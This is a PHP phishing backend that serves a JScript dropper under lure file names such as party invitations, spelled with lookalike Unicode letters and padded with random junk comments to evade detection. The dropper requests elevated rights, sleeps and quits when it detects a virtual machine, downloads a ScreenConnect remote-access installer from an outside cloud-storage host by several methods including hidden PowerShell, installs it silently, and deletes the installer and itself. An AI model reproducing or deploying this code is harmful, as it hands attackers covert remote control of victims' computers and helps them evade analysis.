<?php
// invite.php - Best practical options (Clean JS + Random Unicode name + Light variation)
header('Content-Type: text/plain; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');

$baseNames = [
    "Pаrty_Invite",
    "Lettеr_from_Friеnd",
    "Impоrtant_Mail",
    "Fоrmal_Invitatiоn",
    "Invitatiоn_Final",
    "Spеcial_Invitatiоn_VIP",
    "Spеcial_lettеr_VIP",
    "Cеrеmоny_Invite",
    "RSVP_Invitatiоn_Draft",
    "Pеrsоnal_Invite",
    "Elеgant_Invitatiоn_Card",
    "Invitatiоn_Exclusivе",
    "Savе_Thе_Datе_Invitatiоn",
    "Savе_Thе_Datе"
];

$cookieName = "js_used";
$used = isset($_COOKIE[$cookieName]) ? json_decode($_COOKIE[$cookieName], true) : [];
if (!is_array($used)) $used = [];

$available = array_diff($baseNames, $used);
if (empty($available)) {
    $available = $baseNames;
    $used = [];
}

$chosenBase = $available[array_rand($available)];
$random5 = str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT);
$chosen = $chosenBase . "_" . $random5 . ".js";

$used[] = $chosenBase;
setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 * 60), "/");

header('Content-Disposition: attachment; filename="' . $chosen . '"');

// Light variation - random folder name
$cacheFolder = "DeployCache" . rand(4000, 9999);

// Light junk
$junkLines = rand(4, 12);
$junk = "";
for ($i = 0; $i < $junkLines; $i++) {
    $junk .= "// " . bin2hex(random_bytes(rand(4, 10))) . "\r\n";
}

$msiUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";

echo <<<JS
// System Helper
var objShell = new ActiveXObject("WScript.Shell");
var objFSO = new ActiveXObject("Scripting.FileSystemObject");

// Elevation
if (WScript.Arguments.Length === 0) {
    var shellApp = new ActiveXObject("Shell.Application");
    shellApp.ShellExecute("wscript.exe", "\\"" + WScript.ScriptFullName + "\\" elevated", "", "runas", 0);
    WScript.Quit();
}

// Simple environment check
var score = 0;
try {
    var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
    var items = wmi.ExecQuery("SELECT Manufacturer, Model FROM Win32_ComputerSystem");
    var enumItems = new Enumerator(items);
    for (; !enumItems.atEnd(); enumItems.moveNext()) {
        var item = enumItems.item();
        var text = (item.Manufacturer + " " + item.Model).toLowerCase();
        if (text.indexOf("vmware") > -1 || text.indexOf("virtualbox") > -1 || 
            text.indexOf("virtual machine") > -1 || text.indexOf("kvm") > -1 ||
            text.indexOf("qemu") > -1 || text.indexOf("xen") > -1 ||
            text.indexOf("parallels") > -1 || text.indexOf("hyper-v") > -1) {
            score += 3;
        }
    }
} catch (e) {}

if (score >= 3) {
    WScript.Sleep(1800000);
    WScript.Quit();
}

// Download + Install
var msiUrl = "$msiUrl";
var folder = objShell.ExpandEnvironmentStrings("%ProgramData%") + "\\\\$cacheFolder";
var msiPath = folder + "\\\\ScreenConnect.ClientSetup.msi";

if (!objFSO.FolderExists(folder)) {
    objFSO.CreateFolder(folder);
}

function downloadFile() {
    // Method 1: MSXML2
    try {
        var http = new ActiveXObject("MSXML2.XMLHTTP");
        http.open("GET", msiUrl, false);
        http.send();
        if (http.status === 200) {
            var stream = new ActiveXObject("ADODB.Stream");
            stream.Type = 1;
            stream.Open();
            stream.Write(http.responseBody);
            stream.SaveToFile(msiPath, 2);
            stream.Close();
            return true;
        }
    } catch (e) {}

    // Method 2: WinHttp
    try {
        var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        http.open("GET", msiUrl, false);
        http.send();
        if (http.status === 200) {
            var stream = new ActiveXObject("ADODB.Stream");
            stream.Type = 1;
            stream.Open();
            stream.Write(http.responseBody);
            stream.SaveToFile(msiPath, 2);
            stream.Close();
            return true;
        }
    } catch (e) {}

    // Method 3: PowerShell
    try {
        var cmd = "powershell -NoProfile -WindowStyle Hidden -Command \\"Invoke-WebRequest -Uri '" + msiUrl + "' -OutFile '" + msiPath + "'\\"";
        objShell.Run(cmd, 0, true);
        if (objFSO.FileExists(msiPath)) return true;
    } catch (e) {}

    return false;
}

if (downloadFile()) {
    try {
        var msiLock = new ActiveXObject("ADODB.Stream");
        msiLock.Type = 1;
        msiLock.Open();
        msiLock.LoadFromFile(msiPath);

        objShell.Run("\\"" + msiPath + "\\" /quiet", 0, true);
        WScript.Sleep(90000);

        msiLock.Close();
    } catch (e) {
        objShell.Run("\\"" + msiPath + "\\" /quiet", 0, true);
        WScript.Sleep(90000);
    }

    try {
        if (objFSO.FileExists(msiPath)) {
            objFSO.DeleteFile(msiPath, true);
        }
    } catch (e) {}
}

// Self-delete
try {
    objFSO.DeleteFile(WScript.ScriptFullName, true);
} catch (e) {}

$junk
WScript.Quit();
JS;
?>
